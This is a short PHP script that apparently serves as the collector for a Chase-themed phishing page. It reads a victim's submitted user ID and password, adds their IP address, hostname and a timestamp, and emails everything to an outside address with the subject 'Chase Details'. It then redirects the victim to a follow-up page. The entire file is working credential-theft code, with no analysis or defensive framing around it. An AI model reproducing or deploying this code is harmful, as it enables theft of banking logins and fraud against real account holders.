<?

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");

$message  = "+_______________________+ Going Turbo +_____________________+\n";
$message .= "UserID : ".$_POST['userid']."\n";
$message .= "Password : ".$_POST['password']."\n";

$message .= "________________________\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName  : ".$hostname."\n";
$message .= "Date Log  : ".$date."\n";
$message .= "Time Log  : ".$time."\n";
$message .= "___________________________________________________________\n";


$recipient = "pollysisson@surfbirder.com";
$subject = "Chase Details $ip";
$headers = "Done Deal";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: log.htm");

	   }
?>